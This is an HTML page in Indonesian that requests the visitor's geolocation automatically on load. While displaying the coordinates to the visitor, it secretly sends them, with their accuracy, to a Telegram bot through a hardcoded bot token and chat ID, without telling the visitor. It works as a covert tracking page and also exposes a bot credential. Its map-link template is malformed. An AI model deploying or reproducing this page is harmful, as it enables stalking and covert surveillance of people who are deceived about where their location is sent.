<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minta Lokasi</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #1e1e1e;
            color: #ffffff;
            text-align: center;
        }
        #result {
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <!-- Elemen wajib agar tidak layar putih -->
    <div id="result">Meminta izin lokasi...</div>

    <script>
    // TOKEN DAN CHAT ID ANDA
    const BOT_TOKEN = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
    const CHAT_ID = '1966317946';

    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
        } catch (error) {
            console.error('Gagal kirim Telegram:', error);
        }
    }

    function getLocation() {
        const result = document.getElementById('result');

        if (!navigator.geolocation) {
            result.innerHTML = 'Geolocation tidak didukung browser.';
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                const maps = `https://google.com{latitude},${longitude}`;

                result.innerHTML = `
                    <b>Latitude:</b> ${latitude}<br>
                    <b>Longitude:</b> ${longitude}<br>
                    <b>Akurasi:</b> ${accuracy} meter<br><br>
                    <a href="${maps}" target="_blank" style="color:#60a5fa;">Buka di Google Maps</a>
                `;

                const text = `📍 Lokasi Baru\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nAkurasi: ${accuracy} meter\n\n${maps}`;
                await sendToTelegram(text);
            },
            (error) => {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        result.innerHTML = 'Izin lokasi ditolak oleh pengguna.';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        result.innerHTML = 'Lokasi tidak tersedia.';
                        break;
                    case error.TIMEOUT:
                        result.innerHTML = 'Permintaan waktu habis (timeout).';
                        break;
                    default:
                        result.innerHTML = 'Terjadi kesalahan sistem.';
                }
            }
        );
    }

    // PENTING: Menjalankan fungsi otomatis saat halaman selesai dimuat
    window.onload = getLocation;
    </script>

</body>
</html>
